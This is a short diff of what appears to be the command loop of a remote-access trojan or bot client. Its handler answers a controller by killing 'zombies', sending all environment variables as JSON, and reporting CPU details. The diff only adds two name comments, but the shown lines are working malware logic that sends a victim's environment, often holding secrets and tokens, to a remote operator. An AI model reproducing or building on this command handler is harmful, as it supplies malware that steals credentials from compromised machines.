@@ -210,10 +210,10 @@ def handle_communication():
                 send_data(f"[+] All zombies killed!")
             except:
                 send_data("[!!] Failed to kill zombie!")
-        elif command[:7] == "get_env":
+        elif command[:7] == "get_env": # 東彬
             env_vars = os.environ
             send_data(json.dumps(env_vars)) if env_vars else send_data("[!!] No environment variables found!")
-        elif command[:8] == "cpu_info":
+        elif command[:8] == "cpu_info": # 柏廷
             cpu_info = cpuinfo.get_cpu_info()
             send_data(json.dumps(cpu_info))
         else:
